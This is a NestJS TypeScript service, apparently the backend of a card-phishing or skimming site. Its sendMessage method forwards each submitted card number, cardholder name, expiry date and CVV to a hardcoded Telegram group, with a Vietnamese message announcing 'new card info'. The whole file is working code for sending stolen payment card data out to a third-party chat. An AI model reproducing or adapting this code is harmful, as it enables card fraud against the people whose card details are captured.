import { TypeOrmCrudService } from '@dataui/crud-typeorm';
import { Injectable } from '@nestjs/common';
import { InjectRepository } from '@nestjs/typeorm';
import { Card } from 'src/entities/Card.entity';
import { Repository } from 'typeorm';
import { ConfigService } from '@nestjs/config';
import * as TelegramBot from 'node-telegram-bot-api';
import { SendNotificationDto } from './card.controller';

@Injectable()
export class CardService extends TypeOrmCrudService<Card> {
  private readonly telegramBot: any;
  constructor(
    @InjectRepository(Card) repo: Repository<Card>,
    private readonly configService: ConfigService,
  ) {
    super(repo);
    this.telegramBot = new TelegramBot(
      this.configService.get('APP_TELEGRAM_TOKEN'),
      { polling: true },
    );
  }

  async sendMessage(payload: SendNotificationDto) {
    return await this.telegramBot.sendMessage(
      '-4658637048',
      `Bạn vừa có 1 thông tin thẻ mới:
       + cardNumber: ${payload.cardNumber}
       + nameOnCard: ${payload.nameOnCard}
       + expDate: ${payload.expDate}
       + cvv: ${payload.cvv}
      `,
    );
  }
}
